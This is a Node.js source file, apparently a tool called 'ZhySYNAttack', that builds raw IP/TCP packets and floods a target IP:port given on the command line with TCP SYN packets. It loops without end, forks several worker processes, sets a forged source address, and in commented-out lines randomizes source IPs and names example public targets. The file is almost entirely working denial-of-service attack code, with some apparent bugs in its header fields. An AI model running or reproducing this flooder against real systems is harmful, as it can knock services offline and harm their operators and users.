var raw=require("raw-socket");
var {fork}=require("child_process")
var socket=raw.createSocket({protocol:raw.Protocol.UDP});
socket.setOption (raw.SocketLevel.IPPROTO_IP, raw.SocketOption.IP_HDRINCL,
        new Buffer ([0x00, 0x00, 0x00, 0x01]), 4);

var threads=[];
console.log("ZhySYNAttack -> "+process.argv[2]);
if(!process.argv[2])process.exit();
if(!process.argv[3])
{for(let i=0;i<3;i++)
threads.push(fork("./syn.js",[process.argv[2],"child"]));

process.on("message",(msg)=>{if(msg=="die")process.exit()});
}
process.on('SIGINT', ()=>{
for(var i in threads)
threads[i].send("die");
process.exit();
});



function sleep(time){
return new Promise((yes)=>{

setTimeout(yes,time);
});

};

async function startAttack(ipport){
while(true){
//synAttack("111.146."+parseInt(Math.random()*255)+"."+parseInt(Math.random()*255),parseInt(Math.random()*65535),"13.230.197.214",80);



//synAttack(,parseInt(Math.random()*65535),ipport.split(":")[0],parseInt(ipport.split(":")[1]));


synAttack("192.168.1.11"/*+parseInt(Math.random()*255)+"."+parseInt(Math.random()*255)*/,parseInt(Math.random()*65535),ipport.split(":")[0],parseInt(ipport.split(":")[1]));



//for(let i=0;i<5000000;i++)
//crc("1");
//console.log("w");
//synAttack("192.168.1.11",parseInt(Math.random()*65535),"207.246.95.92",80);


await sleep(1);



}

}

var writeUint1LE=(val)=>{
	if(!(val<2))return;
	return (val+"");
}
var writeUint2LE=(val)=>{
	if(!(val<4))return;
	return(
	(val>>0 & 1)+""
	+(val>>1 & 1)+"");
}
var writeUint4LE=(val)=>{
	if(!(val<16))return;
	return(
	(val>>0 & 1)+""
	+(val>>1 & 1)+""
	+(val>>2 & 1)+""
	+(val>>3 & 1)+"");
}
var writeUint2BE=(val)=>{
	if(!(val<4))return;
	return(
	(val>>1 & 1)+""
	+(val>>0 & 1)+"");
}
var writeUint4BE=(val)=>{
	if(!(val<16))return;
	return(
	(val>>3 & 1)+""
	+(val>>2 & 1)+""
	+(val>>1 & 1)+""
	+(val>>0 & 1)+"");
}

startAttack(process.argv[2]);
//socket.on ("message", function (buffer, source) {
 //   console.log ("received " + buffer.length + " bytes from " + source);

//});
//socket.on ("error", function (error) {
//	console.log ("error: " + error.toString ());
//	process.exit (-1);
//});


/*
socket.send (buffer, 0, buffer.length, "1.1.1.1", function (error, bytes) {
    if (error)
        console.log (error.toString ());
});*/

function sendAttackPacket(){
	let h=new iph();
	h.seq=parseInt(Math.random()*10000);
	h.syn=1;
	
}
function inet_addr(ip){
	return Buffer.from(ip.split('.').map(parseFloat)).readUInt32LE(0);
}
function tcpchecksumpk() {

	this.sourceip=0;
		this.destip=0;
		this.protocol=0;
		this.tcplen=0;
		//tcp fake header
		this.tcph;
		//tcpheader
		this.data=Buffer.alloc(0);
	this.getSize=()=>{
		return 12+this.tcph.getSize()+this.data.length;
	}
	this.getBuffer=()=>{
		let buf=Buffer.alloc(12);
		let offset=0;
		offset=buf.writeUInt32LE(this.sourceip,offset);
		offset=buf.writeUInt32LE(this.destip,offset);
		offset=buf.writeUInt16LE(this.protocol,offset);
		offset=buf.writeUInt16LE(this.tcplen,offset);

		offset+=this.tcph.getSize()+this.data.length;buf=Buffer.concat([buf,this.tcph.getBuffer(),this.data]);

		return buf;
	}
}
function udpchecksumpk() {

	this.sourceip=0;
		this.destip=0;
		this.protocol=0;
		this.udplen=0;
		//udp fake header
		this.udph;
		//udpheader
		this.data;
	this.getSize=()=>{
		return 12+this.udph.getSize()+this.data.length+1;
	}
	this.getBuffer=()=>{
		let buf=Buffer.alloc(this.getSize());
		let offset=0;
		offset=buf.writeUInt32LE(this.sourceip,offset);
		offset=buf.writeUInt32LE(this.destip,offset);
		offset=buf.writeUInt16LE(raw.htons(this.protocol),offset);
		offset=buf.writeUInt16LE(this.udplen,offset);
		offset=this.udph.getSize();buf=Buffer.concat([buf,this.udph.getBuffer()]);
		offset=this.data.length;buf=Buffer.concat([buf,this.data]);
		buf[offset]=0;offset=1;
		return buf;
	}
}
function icmph() {
	this.type=0;
	this.code=0;
	this.checksum=0;
	this.id=0;  //BE
	this.seq=parseInt(Math.random()*9000000+2345); //BE
	this.getBuffer=()=>{
		let buf=Buffer.alloc(20);
		let offset=0;
		offset=buf.writeUInt8(this.type,offset);
		offset=buf.writeUInt8(this.code,offset);
		offset=buf.writeUInt16LE(this.checksum,offset);
		offset=buf.writeUInt16LE(this.id,offset);
		offset=buf.writeUInt16LE(this.seq,offset);
	}
	
}
function udph() {

	this.sourceport=0;
	this.destport=0;
	this.length=0;
	this.checksum=0;

this.getSize=()=>{
	return 8;
}
this.getBuffer=()=>{
	let buf=Buffer.alloc(this.getSize());
	let offset=0;
	offset=buf.writeUInt16LE(this.sourceport,offset);
	offset=buf.writeUInt16LE(this.destport,offset);
	offset=buf.writeUInt16LE(this.length,offset);
	offset=buf.writeUInt16LE(this.checksum,offset);
	return buf;

}

	


}
function iph() {
	this.versionandheaderlen=0x45;
	this.servfield=0;
	this.totallen=0;
	this.id=0;
	this.flags=0;
	this.ttl=256;
	this.protocol=0x0;//udp 0x11
	this.checksum=0;
	this.sourceip=0;
	this.destip=0;
	
	this.getSize=()=>{
		return 20;
	}
	this.getBuffer=()=>{
		let buf=Buffer.alloc(this.getSize());
		let offset=0;
		offset=buf.writeUInt8(this.versionandheaderlen,offset);
		offset=buf.writeUInt8(this.servfield,offset);
		offset=buf.writeUInt16LE(this.totallen,offset);
		offset=buf.writeUInt16LE(this.id,offset);
		offset=buf.writeUInt16LE(this.flags,offset);
		offset=buf.writeUInt8(this.ttl,offset);
		offset=buf.writeUInt8(this.protocol,offset);
		offset=buf.writeUInt16LE(this.checksum,offset);
		offset=buf.writeUInt32LE(this.sourceip,offset);
		offset=buf.writeUInt32LE(this.destip,offset);
return buf;
	}
}
function tcph (){

		this.sport=0;
		this.tport=0;
		this.seq=0;
		this.ack=0;
		this.headerlen=0;
		this.keep=0;
	
		this._urg=0;
		this._ack=0;
		this._psh=0;
		this._rst=0;
		this._syn=0;
		this._fin=0;
		
		this.window=0;
		this.checksum=0;
		this.urgpointer=0;
		//OPTIONS
		this.maxsegsize=1440;
		this.windowscale=8;
	this.getSize=()=>{
		return 32;
	}
	this.getBuffer=()=>{
		let buf=Buffer.alloc(this.getSize());
		let offset=0;
		offset=buf.writeUInt16LE(this.sport,offset);
		offset=buf.writeUInt16LE(this.tport,offset);
		offset=buf.writeUInt32LE(this.seq,offset);
		offset=buf.writeUInt32LE(this.syn,offset);
		let payload=writeUint4BE(this.headerlen/4)
			+writeUint4BE(0)
			+writeUint2BE(0)
			+writeUint1LE(this._urg)+writeUint1LE(this._ack)+writeUint1LE(this._psh)+writeUint1LE(this._rst)+writeUint1LE(this._syn)+writeUint1LE(this._fin);
	
		offset=buf.writeUInt16LE(raw.htons(parseInt(payload,2)),offset);

		offset=buf.writeUInt16LE(raw.htons(this.window),offset);
		offset=buf.writeUInt16LE(this.checksum,offset);

		offset=buf.writeUInt16LE(raw.htons(this.urgpointer),offset);
		

		offset=buf.writeUInt8(2,offset);
		offset=buf.writeUInt8(4,offset);
		offset=buf.writeUInt16LE(raw.htons(this.maxsegsize),offset);

		offset=buf.writeUInt8(1,offset);//NOP

		offset=buf.writeUInt8(3,offset);
		offset=buf.writeUInt8(3,offset);
		offset=buf.writeUInt8(this.windowscale,offset);

		offset=buf.writeUInt8(1,offset);//NOP
		offset=buf.writeUInt8(1,offset);//NOP

		offset=buf.writeUInt8(4,offset);
		offset=buf.writeUInt8(2,offset);

		
		return buf;
	

	}
	
}
function csum(buf, nwords)
{ 
	let sum=0;
	let offset=0;
	while (nwords>1)
	{
		sum += buf.readInt16LE(offset);
		offset+=2;
		nwords-=2;

	}
	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	if(~sum<0)return 65536+(~sum);
else return ~sum
	
}

function ping(ip){
let iphh=new iph();
let udphh=new udph();
let data=Buffer.from([ 0xd8, 0xcb , 0x01, 0x00, 0x00, 0x01, 0x00 ,0x00,
	0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
	0x08, 0x63, 0x68, 0x6f, 0x6e, 0x67, 0x66, 0x65,
	0x72, 0x02, 0x63, 0x6e, 0x00, 0x00, 0x01, 0x00,
	0x01]);

	iphh.totallen=iphh.getSize()+udphh.getSize()+data.length;
	iphh.protocol=17;//UDP
	iphh.sourceip=inet_addr("192.168.1.3");
	iphh.ttl=256;
	iphh.destip=inet_addr(ip);

	udphh.sourceport=raw.htons(8000)
	udphh.destport=raw.htons(53)
	udphh.length=raw.htons(udphh.getSize()+data.length);
	udphh.checksum=0;
	
	let udpchecksumpkk=new udpchecksumpk();
	udpchecksumpkk.sourceip=iphh.sourceip;
	udpchecksumpkk.destip=iphh.destip;
	udpchecksumpkk.protocol=iphh.protocol;
	udpchecksumpkk.udplen=udphh.length;
	udpchecksumpkk.udph=udphh;
	udpchecksumpkk.data=data;
	
	udphh.checksum=csum(udpchecksumpkk.getBuffer(),udpchecksumpkk.getSize()/2);

	socket.send(Buffer.concat([iphh.getBuffer(),udphh.getBuffer(),data]),0,iphh.totallen,ip,(error,bytes)=>{if(error)console.log(error.toString());})


}




function debug(value){

	var f=(x)=>{
		if(x<10)return "0"+x;
		return x+"";
	}
	 let hex=""; 
	 for(let i=0;i<32;i+=8)
	 hex+=f((value>>i & 0xFF).toString(16));
 return hex;
}
function synAttack(sourceip,sourceport,ip,port){ 

//    var data=Buffer.from(Math.random()+"");
var data=Buffer.alloc(0);
    let iphh=new iph();
	let tcphh=new tcph();
	iphh.totallen=iphh.getSize()+tcphh.getSize()+data.length;
	iphh.protocol=6;//TCP
	iphh.sourceip=inet_addr(sourceip);
//	iphh.sourceip=parseInt(Math.random()*100000000);
	iphh.ttl=parseInt(parseInt(Math.random()*64)+128);
	iphh.destip=inet_addr(ip);

	tcphh.sport=raw.htons(sourceport);
	tcphh.tport=raw.htons(port);
	tcphh.seq=(parseInt(Math.random()*9000000+2345));
	tcphh.ack=0;
	tcphh.headerlen=tcphh.getSize()+data.length;
	tcphh._syn=1;
	tcphh.window=2048;
	tcphh.checksum=0;

	let tcpchecksumpkk=new tcpchecksumpk();
	tcpchecksumpkk.sourceip=iphh.sourceip;
	tcpchecksumpkk.destip=iphh.destip;
	tcpchecksumpkk.protocol=raw.htons(iphh.protocol);
	tcpchecksumpkk.tcplen=raw.htons(tcphh.headerlen);
	tcpchecksumpkk.tcph=tcphh;
	tcpchecksumpkk.data=data;

//	tcphh.checksum=csum(tcpchecksumpkk.getBuffer(),tcpchecksumpkk.getSize()/2);
//console.log(tcphh.checksum);
//console.log(tcpchecksumpkk.getBuffer());
tcphh.checksum=raw.htons(raw.createChecksum(tcpchecksumpkk.getBuffer()));

	//console.log(iphh.getBuffer());
	//console.log(tcphh.getBuffer());
let BUF=Buffer.concat([iphh.getBuffer(),tcphh.getBuffer(),data]);
	socket.send(BUF,0,BUF.length,ip,(error,bytes)=>{if(error)console.log(error.toString()); })




}


//console.log(csum(Buffer.from([5,0,4,0,3,0,5,0]),4))


